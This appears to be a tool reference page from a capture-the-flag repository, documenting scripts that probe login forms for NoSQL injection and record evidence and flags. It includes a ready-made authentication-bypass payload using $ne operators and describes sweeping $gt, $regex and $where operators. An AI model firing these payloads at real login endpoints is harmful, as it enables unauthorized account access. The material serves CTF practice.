# Tooling — the repo's NoSQLi primitives

## `tools/web/nosqli_probe.py` — the operator-matrix

```bash
python3 tools/web/nosqli_probe.py --url "http://t/login" --json \
  --user-field user --pass-field pass \
  --good-user "test" --good-pass "test"
```

`nosqli_probe` — fires the operator-matrix (`$ne`, `$gt`, `$regex`,
`$where`, the `user[op]` form-carriers) — grades each against the
success side.

Flags:

- `--url URL`
- `--method {POST,GET}` — default POST
- `--body BODY` — the form template; `{M}`=user slot, `{P}`=pass slot
- `--json` — JSON carrier (vs form)
- `--user-field USER_FIELD` — the user field's name
- `--pass-field PASS_FIELD` — the pass field's name
- `--good-user GOOD_USER` — a valid-looking user
- `--good-pass GOOD_PASS` — a valid-looking pass
- `--headers [HEADERS ...]`
- `--timeout TIMEOUT`
- `--write-ok` — allow a write-looking URL
- `--selftest` — the offline proof

## `tools/web/http_probe.py` — the request+response holder

```bash
python3 tools/web/http_probe.py --challenge <name> --url "http://t/login" \
  --body '{"user":{"$ne":null},"pass":{"$ne":null}}' \
  --header "Content-Type: application/json"
```

`http_probe` — holds request+response — emits `post-probe` with
`--response` pre-filled — `evidence-rules.md`.

## `tools/web/variant_matrix.py` — the shape-sweep

```bash
python3 tools/web/variant_matrix.py --challenge <name> --url "http://t/" \
  --json-field user --families nosql
```

`variant_matrix` — the shape-sweep — `detection.md`.

## `tools/hooks.py` — the gate

```bash
python3 tools/hooks.py pre-probe <name> \
  --request 'POST /login {"user":{"$ne":null}}' \
  --class web-nosqli --hypothesis-id h1

python3 tools/hooks.py post-probe <name> \
  --request 'POST /login {"user":{"$ne":null}}' \
  --verdict confirms --evidence-kind class --class web-nosqli \
  --hypothesis-id h1 --evidence "<excerpt>" --response "<raw>"

python3 tools/hooks.py pre-flag <name> \
  --value "flag{...}" --source "response" --evidence "<excerpt>"
```

`evidence-rules.md`.

## `tools/state.py` — the ledger

```bash
python3 tools/state.py <name> --bug-class web-nosqli
python3 tools/state.py <name> --hypothesis "operator-injection via qs"
python3 tools/state.py <name> --strategy-used chain_match
```

## `tools/decide.py` — the controller

```bash
python3 tools/decide.py <name>
```

## `tools/chain_match.py` — the verified chains

```bash
python3 tools/chain_match.py --record <name>
```

The UnEarthly Shop card — the `$unionWith` aggregation — `aggregation.md`.

## `tools/writeup_search.py` — the writeup shortcut

```bash
python3 tools/writeup_search.py "<challenge> <event>"
```
